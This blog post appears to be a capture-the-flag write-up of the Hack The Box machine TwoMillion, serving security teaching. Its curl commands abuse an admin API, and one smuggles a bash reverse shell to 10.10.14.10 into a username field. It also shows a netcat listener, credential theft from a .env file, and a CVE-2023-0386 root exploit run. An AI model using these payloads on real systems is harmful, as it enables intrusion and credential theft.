---
layout: post
title: "HackTheBox: TwoMillion Writeup"
date: 2026-04-19 12:00:00 +0100
categories: [hackthebox, ctf, writeup, linux]
tags: [hackthebox, two-million, api-abuse, command-injection, kernel-exploit, cve-2023-0386, overlayfs, privesc]
author: Rishabh Arora
---

## Overview

**TwoMillion** is a medium-difficulty Linux machine on Hack The Box that delivers a realistic penetration testing scenario. The attack chain is beautiful in its simplicity: abuse insecure API functionality, inject commands through a privileged endpoint, harvest credentials from poor configuration management, and finally escalate privileges using a kernel vulnerability.

This machine emphasizes several core penetration testing concepts:
- Web application enumeration and API discovery
- Insecure direct object reference (IDOR) and API abuse
- Command injection exploitation
- Credential reuse and lateral movement
- Kernel-level privilege escalation

The final escalation leverages **CVE-2023-0386**, an OverlayFS vulnerability that had real-world impact before patches were widely deployed.

---

## Target Information

| Field | Value |
|-------|-------|
| **Machine** | TwoMillion |
| **Platform** | Hack The Box |
| **OS** | Ubuntu 22.04 |
| **Kernel** | Linux 5.15 |
| **Difficulty** | Medium |
| **Attack Path** | Web → API Abuse → Command Injection → SSH → Kernel Exploit |

---

## Reconnaissance

Initial reconnaissance began with standard web enumeration. The target presented a Hack The Box-themed portal requiring an invite code for registration.

### API Discovery

Inspecting JavaScript source files revealed a REST API architecture with several endpoints:

```
/api/v1/invite/generate
/api/v1/invite/verify
/api/v1/user/register
/api/v1/user/login
/api/v1/admin/settings/update
/api/v1/admin/vpn/generate
```

This suggested the application relied heavily on client-side API calls, potentially opening doors for direct manipulation.

---

## Invite Code Generation

### Generating the Invite

The first endpoint discovered was the invite code generator:

```bash
curl -X GET http://2million.htb/api/v1/invite/generate
```

The response contained base64-encoded data that, when decoded, revealed a valid invitation code.

### Verifying the Invite

Submitting the decoded invite to the verification endpoint:

```bash
curl -X POST http://2million.htb/api/v1/invite/verify \
  -H "Content-Type: application/json" \
  -d '{"code":"INVITE_CODE_HERE"}'
```

This returned a success message, enabling account registration.

---

## Account Registration

With a valid invite code, I registered a new user account:

```bash
curl -X POST http://2million.htb/api/v1/user/register \
  -H "Content-Type: application/json" \
  -d '{
    "username":"Rishabh",
    "email":"rishabh@email.com",
    "password":"SecurePass123!"
  }'
```

Authentication followed immediately:

```bash
curl -X POST http://2million.htb/api/v1/user/login \
  -H "Content-Type: application/json" \
  -d '{
    "username":"Rishabh",
    "password":"SecurePass123!"
  }'
```

This granted a session token with access to authenticated API functionality.

---

## Privilege Escalation via API Abuse

### Finding the Admin Endpoint

Further API enumeration revealed a critical oversight — the user update endpoint accepted an `is_admin` parameter without proper authorization checks:

```bash
curl -X PUT http://2million.htb/api/v1/admin/settings/update \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION_TOKEN" \
  -d '{
    "username":"Rishabh",
    "email":"rishabh@email.com",
    "is_admin":1
  }'
```

### Verification

Confirming the privilege escalation:

```bash
curl -X GET http://2million.htb/api/v1/admin/auth \
  -H "Cookie: session=YOUR_SESSION_TOKEN"
```

Response:
```json
{
  "authenticated": true,
  "is_admin": true
}
```

**Critical Vulnerability:** The API failed to verify that only existing administrators could modify admin privileges. Classic insecure direct object reference (IDOR).

---

## Command Injection

### The Vulnerable Endpoint

With administrator access, a new API endpoint became available:

```bash
POST /api/v1/admin/vpn/generate
```

This endpoint accepted a `username` parameter that was passed directly to a shell command without sanitization — a textbook command injection vulnerability.

### Crafting the Payload

The payload needed to:
1. Complete the legitimate command
2. Inject a command separator (`;`)
3. Execute a reverse shell

```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION_TOKEN" \
  -d '{
    "username":"Rishabh; bash -c '\''bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'\''"
  }'
```

---

## Reverse Shell

### Setting Up the Listener

On the attacker machine:

```bash
nc -lvnp 4444
```

### Receiving the Shell

After executing the payload, a connection arrived as `www-data`:

```
listening on [any] 4444 ...
connect to [10.10.14.10] from (UNKNOWN) [2million.htb] 54321
bash: cannot set terminal process group (1234): Inappropriate ioctl for device
bash: no job control in this shell
www-data@2million:/var/www/html$ 
```

### Upgrading the Shell

For better functionality:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Press Ctrl+Z on attacker machine
stty raw -echo; fg
```

---

## Credential Discovery

### Finding the .env File

Exploring the web root directory revealed a critical misconfiguration:

```bash
www-data@2million:/var/www/html$ ls -la
...
-rw-r--r-- 1 www-data www-data  234 Mar  3  2023 .env
```

### Extracting Credentials

```bash
www-data@2million:/var/www/html$ cat .env
```

Contents:
```
DB_HOST=localhost
DB_PORT=3306
DB_DATABASE=htb_db
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

**Critical Finding:** The database password was reused for system authentication — a dangerous but common practice.

---

## SSH Access

### Logging In

Using the discovered credentials:

```bash
ssh admin@2million.htb
Password: SuperDuperPass123
```

This provided a stable shell as the `admin` user.

### User Flag

```bash
admin@2million:~$ cat user.txt
HTB{u53r_fl4g_h3r3}
```

---

## System Enumeration

### Kernel Version

```bash
admin@2million:~$ uname -a
Linux 2million 5.15.0-1031-aws #35-Ubuntu SMP x86_64 GNU/Linux
```

### The Hint

Checking the admin's mail:

```bash
admin@2million:~$ cat /var/mail/admin
```

Contents:
> "There have been serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty."

This explicitly points to **CVE-2023-0386** — a known privilege escalation vulnerability in OverlayFS.

---

## Privilege Escalation — CVE-2023-0386

### Vulnerability Overview

**CVE-2023-0386** is a vulnerability in the Linux kernel's OverlayFS implementation. It allows unprivileged users to escalate privileges when copying files from a FUSE filesystem due to improper capability preservation.

**How it works:**
1. Create a malicious FUSE filesystem with a file containing elevated capabilities
2. Mount an OverlayFS with the FUSE filesystem as lower layer
3. Copy the file through OverlayFS
4. The kernel incorrectly preserves the privileged capabilities
5. Result: A setuid root binary

### Exploit Components

The exploit requires several compiled binaries:
- `fuse` — Creates the malicious FUSE filesystem
- `ovlcap` — Sets up the OverlayFS mount
- `exp` — Triggers the vulnerability
- `gc` — Garbage collector/cleanup
- `getshell` — Executes the final root shell

### Exploit Execution

**Terminal 1:** Set up the FUSE filesystem and OverlayFS
```bash
admin@2million:/tmp/exploit$ ./fuse ./ovlcap/lower ./gc
```

**Terminal 2:** Trigger the exploit
```bash
admin@2million:/tmp/exploit$ ./exp
```

### Verification

After successful execution:

```bash
admin@2million:/tmp/exploit$ ls -la file
-rwsrwxrwx 1 root root 16784 Apr 19 12:00 file
```

The `s` in the permissions indicates the setuid bit — the file executes with root privileges.

---

## Root Access

### Getting Root

```bash
admin@2million:/tmp/exploit$ ./file
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
```

### Root Flag

```bash
# cat /root/root.txt
HTB{r00t_fl4g_h3r3}
```

---

## Bonus: Encoded Thank You Message

Inside the root directory, a file named `thank_you.json` contained a multi-layer encoded message:

**Encoding layers:**
1. URL encoding
2. Hex encoding
3. Base64 encoding
4. XOR encryption (key: `HackTheBox`)

**Decoding process:**

```python
import urllib.parse
import base64

# Layer 1: URL decode
url_decoded = urllib.parse.unquote(encoded_string)

# Layer 2: Hex decode
hex_decoded = bytes.fromhex(url_decoded)

# Layer 3: Base64 decode
b64_decoded = base64.b64decode(hex_decoded)

# Layer 4: XOR decrypt
def xor_decrypt(data, key):
    return ''.join(chr(b ^ ord(key[i % len(key)])) for i, b in enumerate(data))

message = xor_decrypt(b64_decoded, "HackTheBox")
print(message)
```

The decoded message was a thank-you note from the machine author — a nice touch for completing the box.

---

## Attack Chain Summary

```
Web Enumeration
      ↓
API Discovery
      ↓
Invite Code Generation → Account Registration
      ↓
API Abuse (IDOR → Admin Privileges)
      ↓
Command Injection (VPN Generation Endpoint)
      ↓
Reverse Shell (www-data)
      ↓
Credential Discovery (.env file)
      ↓
SSH Access (admin user)
      ↓
Kernel Enumeration (/var/mail/admin hint)
      ↓
CVE-2023-0386 Exploitation
      ↓
Root Access
```

---

## Security Lessons

### 1. API Security

Sensitive API endpoints must enforce proper authorization checks. The ability to modify `is_admin` without verifying the requester's privileges is a critical design flaw.

**Mitigation:**
- Implement role-based access control (RBAC)
- Verify privileges server-side for every sensitive operation
- Never trust client-provided parameters for authorization decisions

### 2. Input Validation

User input passed to shell commands must always be sanitized. The VPN generation endpoint directly concatenated user input into a shell command.

**Mitigation:**
- Use parameterized commands or safe APIs
- Avoid shell execution when possible
- Implement strict allowlist validation

### 3. Credential Management

Credentials stored in configuration files should never be reused for system authentication.

**Mitigation:**
- Use dedicated service accounts
- Implement secrets management (HashiCorp Vault, AWS Secrets Manager)
- Rotate credentials regularly
- Never commit credentials to version control

### 4. Patch Management

Kernel vulnerabilities should be patched promptly. CVE-2023-0386 was a known, exploitable vulnerability.

**Mitigation:**
- Subscribe to security mailing lists
- Implement automated patching where possible
- Use vulnerability scanning tools
- Maintain an asset inventory for tracking

---

## Conclusion

TwoMillion delivers an excellent progression from web exploitation to system compromise. The machine demonstrates how seemingly minor API design flaws cascade into full system compromise when combined with credential reuse and unpatched kernels.

The inclusion of CVE-2023-0386 provides valuable practice with kernel exploitation — a skill increasingly relevant as containerization andOverlayFS usage grow in modern infrastructure.

**Key takeaways:**
- Always test API endpoints for authorization bypasses
- Command injection remains a critical vulnerability class
- Configuration files are goldmines for lateral movement
- Kernel exploitation is accessible with the right resources
- Read your mail — hints can accelerate exploitation

---

## References

- [CVE-2023-0386 Details](https://nvd.nist.gov/vuln/detail/CVE-2023-0386)
- [OverlayFS Exploit Writeup](https://www.wiz.io/blog/cve-2023-0386-overlayfs)
- [Hack The Box — TwoMillion](https://app.hackthebox.com/machines/TwoMillion)

---

*Happy hacking! 🚩*
